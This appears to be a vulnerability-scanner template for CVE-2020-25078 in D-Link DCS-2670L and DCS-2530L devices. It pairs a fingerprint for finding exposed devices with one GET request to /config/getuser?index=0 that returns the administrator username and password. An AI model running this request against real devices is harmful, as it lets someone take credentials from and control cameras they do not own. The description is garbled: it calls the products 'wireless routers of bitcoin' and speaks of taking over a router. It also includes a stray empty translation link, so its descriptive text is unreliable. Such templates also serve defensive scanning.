name: D_Link_DCS_Monitor_Password_Information_Disclosure__CVE_2020_25078
transport: http
set: {}
detail:
  dock: '(app="DLink-Network-Camera" || title="Document Error: Unauthorized")'
  product: D-Link DCS-2670L  and D-Link DCS-2530L
  homepage: http://www.dlink.com.cn/
  impact: <p><a href="https://fanyi.baidu.com/translate?aldtype=16047&amp;query=&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh###"></a><a></a></p><p>This
    vulnerability will lead to the password disclosure of remote administrator, and
    make the attacker take over the router through the vulnerability</p>
  description: Both D-Link dcs-2670l and D-Link dcs-2530l are wireless routers of
    bitcoin (D-Link). There are security vulnerabilities in D-Link dcs-2530l before
    1.06.01 hotfix and dcs-2670l before 2.02. This vulnerability can lead to remote
    administrator password disclosure.
rules:
  r1:
    method: GET
    path: /config/getuser?index=0
    follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b'name') && response.body.bcontains(b'pass')
expression: r1()
